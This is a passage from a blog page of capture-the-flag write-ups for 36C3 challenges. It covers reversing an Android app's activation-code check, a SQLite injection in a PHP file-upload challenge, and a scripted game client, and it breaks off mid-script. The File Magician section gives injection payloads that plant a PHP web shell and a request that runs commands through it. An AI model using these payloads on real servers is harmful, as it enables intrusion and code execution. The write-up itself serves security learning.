@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>36C3 CTF Writeups</title>
+        <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: #ffe135;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font.css">
+
+
+ <link rel="stylesheet" href="https://bananamafia.dev//css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/main.css">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font-awesome.min.css" integrity="">
+ 
+
+
+<script src="https://bananamafia.dev/js/highlight.min.js"></script>
+
+
+<script src="https://bananamafia.dev/js/python.min.js"></script> 
+<script src="https://bananamafia.dev/js/cpp.min.js"></script> 
+<script src="https://bananamafia.dev/js/json.min.js"></script> 
+<script src="https://bananamafia.dev/js/go.min.js"></script> 
+
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143157939-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-143157939-1');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://bananamafia.dev/js/jquery.min.js"></script>
+
+
+<script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.60.1" />
+        
+
+        
+    </head>
+
+    
+
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">36C3 CTF Writeups</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/post/">Posts</a></li>
+                            
+                                <li><a href="/project/">Projects</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:ps1337@mailbox.org"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/CaptnBanana"><i class="fa fa-twitter"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="/index.xml"><i class="fa fa-rss"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://www.youtube.com/watch?v=QKWKUU0XQ8U"><i class="fa fa-envira"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/36c3ctf/">36C3 CTF Writeups</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reversing"><kbd class="item-tag">reversing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+
+</div>
+
+
+    <br>
+    <div class="content-width text-justify"><p><img src="/img/36c3ctf/banner.png" alt="36C3 CTF"></p>
+<h1 id="1337-skills">1337 skills</h1>
+<p>Task description:</p>
+<p><em>It’s too hard to gain all 1337 h4x0r skills required by nowadays CTFs ._.!</em>
+<em>I am glad a friendly hacker told me about an App he got during a (growth) hacking course.</em>
+<em>Sadly, he didn’t wrote down any activations codes.</em></p>
+<p><em>Ready for your hacking exam?</em></p>
+<hr>
+<p>As can be read above, <a href="https://play.google.com/store/apps/details?id=com.progressio.wildskills">an Android app</a> was given at the beginning of the challenge, with the hint to get a valid activation code for it.</p>
+<p>I've decided to just analyze it statically at first, so I've grabbed the <code>apk</code> from <a href="https://apkpure.com/wild-skills/com.progressio.wildskills/download?from=details">apkpure</a>. Then, I've decompiled it with <a href="https://github.com/Konloch/bytecode-viewer">BytecodeViewer</a>.</p>
+<p>Searching for the string <code>activat</code> in the whole application revealed the following method in the <code>MainActivity</code> class:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">activateApp</span><span style="color:#f92672">(</span>View var1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">int</span> var2<span style="color:#f92672">;</span>
+    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+        var2 <span style="color:#f92672">=</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">parseInt</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">editTextActivation</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NumberFormatException var5<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        var2 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>1<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+    Calendar var6 <span style="color:#f92672">=</span> Calendar<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var2 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span><span style="color:#f92672">)</span><span style="color:#f92672">(</span>Math<span style="color:#f92672">.</span><span style="color:#a6e22e">pow</span><span style="color:#f92672">(</span><span style="color:#f92672">(</span><span style="color:#66d9ef">double</span><span style="color:#f92672">)</span><span style="color:#f92672">(</span>var6<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> <span style="color:#f92672">*</span> var6<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>1<span style="color:#f92672">)</span><span style="color:#f92672">)</span><span style="color:#f92672">,</span> 2<span style="color:#f92672">.</span><span style="color:#a6e22e">0D</span><span style="color:#f92672">)</span> <span style="color:#f92672">%</span> 999983<span style="color:#f92672">.</span><span style="color:#a6e22e">0D</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">findViewById</span><span style="color:#f92672">(</span>2131296458<span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">setVisibility</span><span style="color:#f92672">(</span>4<span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        <span style="color:#f92672">(</span><span style="color:#f92672">(</span>InputMethodManager<span style="color:#f92672">)</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getSystemService</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;input_method&#34;</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hideSoftInputFromWindow</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">editTextActivation</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getWindowToken</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">,</span> 0<span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        Editor var7 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">prefsmain</span><span style="color:#f92672">.</span><span style="color:#a6e22e">edit</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        var7<span style="color:#f92672">.</span><span style="color:#a6e22e">putBoolean</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Activated&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">long</span> var3 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Date<span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getTime</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        var7<span style="color:#f92672">.</span><span style="color:#a6e22e">putLong</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Installed&#34;</span><span style="color:#f92672">,</span> var3<span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        var7<span style="color:#f92672">.</span><span style="color:#a6e22e">putLong</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ActivationDate&#34;</span><span style="color:#f92672">,</span> var3<span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        var7<span style="color:#f92672">.</span><span style="color:#a6e22e">commit</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+        Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Ungültiger Aktivierungscode&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">show</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">editTextActivation</span><span style="color:#f92672">.</span><span style="color:#a6e22e">requestFocus</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        <span style="color:#f92672">(</span><span style="color:#f92672">(</span>InputMethodManager<span style="color:#f92672">)</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getSystemService</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;input_method&#34;</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">showSoftInput</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">editTextActivation</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+
+<span style="color:#f92672">}</span>
+</code></pre></div><p>I proceeded by just pasting the decompiler output in a new Java source file and building a simple application around it that prints the expected value:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">import</span> java.util.*<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">yolo</span>
+<span style="color:#f92672">{</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">[</span><span style="color:#f92672">]</span> args<span style="color:#f92672">)</span>
+    <span style="color:#f92672">{</span>
+
+        Calendar var6 <span style="color:#f92672">=</span> Calendar<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+
+        <span style="color:#66d9ef">int</span> test <span style="color:#f92672">=</span> <span style="color:#f92672">(</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span><span style="color:#f92672">)</span><span style="color:#f92672">(</span>Math<span style="color:#f92672">.</span><span style="color:#a6e22e">pow</span><span style="color:#f92672">(</span><span style="color:#f92672">(</span><span style="color:#66d9ef">double</span><span style="color:#f92672">)</span><span style="color:#f92672">(</span>var6<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> <span style="color:#f92672">*</span> var6<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>1<span style="color:#f92672">)</span><span style="color:#f92672">)</span><span style="color:#f92672">,</span> 2<span style="color:#f92672">.</span><span style="color:#a6e22e">0D</span><span style="color:#f92672">)</span> <span style="color:#f92672">%</span> 999983<span style="color:#f92672">.</span><span style="color:#a6e22e">0D</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">print</span><span style="color:#f92672">(</span>test<span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>This printed <code>667518</code> as activation code.</p>
+<p>Connecting to the challenge service and submitting this value shows that in order to solve the challenge, more activation codes are required. The Android application manages some sort of courses, which can be activated individually. It's required to get an activation code for all courses to pass the challenge. Luckily, <code>MainActivity</code> has us covered again:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">courseActivation</span><span style="color:#f92672">(</span>View var1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    <span style="color:#f92672">[</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">]</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var4<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sgk258&#34;</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#f92672">[</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">]</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+            Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Ungültiger Aktivierungscode&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">show</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+        <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">case</span> 1<span style="color:#f92672">:</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var4<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;wmt275&#34;</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#f92672">[</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">]</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+            Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Ungültiger Aktivierungscode&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">show</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var4<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;udh736&#34;</span><span style="color:#f92672">)</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#f92672">[</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">]</span>
+    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+        Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Ungültiger Aktivierungscode&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">)</span><span style="color:#f92672">.</span><span style="color:#a6e22e">show</span><span style="color:#f92672">(</span><span style="color:#f92672">)</span><span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>Now those codes have to be submitted in order:</p>
+<pre><code>$ nc 88.198.154.132 7002
+Activation code:
+667518
+activated!
+Sales activation code:
+sgk258
+activated!
+Leadership activation code:
+wmt275
+activated
+Service Roadmap (SRM) activation code:
+udh736
+activated!
+Congratulations please give me your name:
+bananaboiii
+   ______________________________
+ / \                             \.
+|   |                            |.
+ \_ |                            |.
+    | Certificate of Attendance  |.
+    |                            |.
+    |  This is to certify that   |.
+    |                            |.
+    |        bananaboiii         |.
+    |                            |.
+    |        has attended        |.
+    |                            |.
+    | **The baby rev challenge** |.
+    |                            |.
+    |                            |.
+    |                       hxp  |.
+    |                            |.
+    | -------------------------- |.
+    |                            |.
+    |hxp{thx_f0r_4773nd1n6_70d4y}|.
+    |                            |.
+    |   _________________________|___
+    |  /                            /.
+    \_/____________________________/.
+</code></pre><h1 id="file-magician">File Magician:</h1>
+<p>Challenge description:</p>
+<p><em>Finally (again), a minimalistic, open-source file hosting solution.</em></p>
+<hr>
+<p>The PHP source code for this challenge was given.</p>
+<p>Opening the challenge in a browser shows a simple file upload form. It also shows the uploaded files afterwards and allows downloading them. Additionally, the output of <code>file $file</code> is shown next to the download link. The web application uses SQLite to store this meta data.</p>
+<p>While analyzing the source code, this was found to be rather suspicious:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (isset($_FILES[&#39;file&#39;]) <span style="color:#960050;background-color:#1e0010">&amp;</span><span style="color:#960050;background-color:#1e0010">&amp;</span> $_FILES[&#39;file&#39;][&#39;size&#39;] &lt; <span style="color:#f92672">10</span><span style="color:#960050;background-color:#1e0010">*</span><span style="color:#a6e22e">1024</span> <span style="color:#960050;background-color:#1e0010">)</span><span style="color:#960050;background-color:#1e0010">{</span>
+    <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">s </span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;INSERT INTO upload(info) VALUES (&#39;&#34;</span> <span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">new</span> <span style="color:#a6e22e">finfo</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#a6e22e">-</span>&gt;file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]). &#34; &#39;);&#34;;
+    $db-&gt;exec($s);
+    [...]
+}
+</code></pre></div><p>The web application passes the output of <code>(new finfo)-&gt;file($file)</code> to the database without prior sanitation. This means that SQLite injection can be achieved by causing the <code>file $file</code> call to output the injection payload.</p>
+<p>The initial approach was to check the filetype database of <a href="https://github.com/file/file/tree/master/magic/Magdir">GNU file</a> to find a file type that allows to control the output. The <code>Magdir</code> files in the link above use the placeholder <code>%s</code> exactly for this cause. While messing around with several files, it was found that <code>.tar.gz</code> files can be used for this:</p>
+<pre><code>$ file /tmp/yolo.tar.gz
+/tmp/yolo.tar.gz: gzip compressed data, was &quot;yolo.tar&quot;, last modified: Sat Dec 28 20:52:03 2019, from Unix, original size modulo 2^32 10240
+</code></pre><p>Uploading this file in the web application confirms that the <code>was &quot;yolo.tar&quot;</code> is also shown and therefore was also processed by the <code>$db-&gt;exec()</code> call. Let's grab your favorite hex editor and add a simple SQL injection POC right after the file name that's being displayed:</p>
+<p><img src="/img/36c3ctf/filemagic-hex.jpg" alt="Hex Hax"></p>
+<p>Now that it was confirmed to work, it's required to read the flag from the target. I've used a PHP web shell that was uploaded using this exploit. These are the database calls that were used and injected into the <code>.tar.gz</code> file:</p>
+<pre><code>');ATTACH DATABASE 'x.php' AS lol; CREATE TABLE lol.pwn (dataz text);--
+');ATTACH DATABASE 'x.php' AS lol; INSERT INTO lol.pwn (dataz) VALUES ('&lt;?=`$_GET[1]`?&gt;');--
+</code></pre><p>The payload was stolen from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">here</a> and modified.</p>
+<p>There are some restrictions regarding the embedded SQL payload: There's a size limit, so the payload was split into two separate files. One creates a new <code>.php</code> file and the other one writes a minimal PHP shell to it. A relative path (<code>x.php</code>) was chosen since this already points to a directory that's both writable and executable via a link.</p>
+<p>After that, visiting <code>http://78.47.152.131:8000/files/[dir]/x.php?1=cat%20/flag*</code> prints the flag:</p>
+<pre><code>SQLite format 3@ .0: ��/GtablepwnpwnCREATE TABLE pwn (dataz text) ��+hxp{I should have listened to my mum about not trusting files about files}
+</code></pre><h1 id="catch-the-flag">Catch The Flag</h1>
+<p>Task description:</p>
+<p><em>Just catch me.</em></p>
+<hr>
+<p>Well Ok.</p>
+<p>A game source code and client were given. Executing <code>./client.py 78.47.17.200 7888</code> drops you into the game:</p>
+<p><img src="/img/36c3ctf/catchtheflag.jpg" alt="Catch The Flag"></p>
+<p>After analyzing the source code it becomes clear that the players can move in the map with WASD keys. All of this is not shown in the game client itself, only events are displayed. These events are:</p>
+<ul>
+<li>You are walking against a wall</li>
+<li>You are about to drop into a pit and will die eventually</li>
+<li>You &ldquo;smell&rdquo; a flag</li>
+</ul>
+<p>The flag string was split into individual characters and placed on the map into a line:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">flag <span style="color:#f92672">=</span> []
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag.txt</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    tmp <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
+    <span style="color:#66d9ef">for</span> x, i <span style="color:#f92672">in</span> enumerate(tmp):
+        flag<span style="color:#f92672">.</span>append(FlagChar(i, (width <span style="color:#f92672">/</span><span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">-</span> (len(tmp) <span style="color:#f92672">/</span><span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> x, height <span style="color:#f92672">/</span><span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>, width, height))
+</code></pre></div><p>The goal is to blindly catch all flag characters and assemble the flag from them afterwards. The layout of the map is not initially known to the player. Also, the flag characters move randomly after the player has taken some steps on the map. This effectively shuffles the flag characters over time and makes assembling the flag harder.</p>
+<p>While all of this can be done manually and from the game client GUI, the service speaks a very simple ASCII based protocol that can be accessed with <code>nc</code> or <code>pwntools</code>. Hence, the interaction with the game can be scripted.</p>
+<p>The fact that the flag characters are moving over time is quite interesting and allows catching all individual characters easily and in a scriptable manner. During tests it was found that there exists a long path on the map without any pits. By continuously walking left and right, the flag characters will eventually move into the path of the player and can therefore be caught.</p>
+<p>I've used this beautiful script for that:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+flags <span style="color:#f92672">=</span> []
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">doIt</span>():
+    <span style="color:#66d9ef">global</span> flags
+
+    <span style="color:#66d9ef">try</span>:
+        io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">78.47.17.200</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">7888</span>)
+        <span style="color:#66d9ef">while</span> True:
+            io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">&#34;</span>)
+            line <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
+
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">iw</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                <span style="color:#66d9ef">continue</span>
+
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">i</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                <span style="color:#66d9ef">continue</span>
+
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">smell</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                <span style="color:#66d9ef">continue</span>
+
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">breeze</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                <span style="color:#66d9ef">continue</span>
+
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line <span style="color:#f92672">and</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">h</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">** Got: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> line
+                flags<span style="color:#f92672">.</span>append(line)
+
+                <span style="color:#75715e"># walk to the path way</span>
+                keys <span style="color:#f92672">=</span> []
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">12</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>)
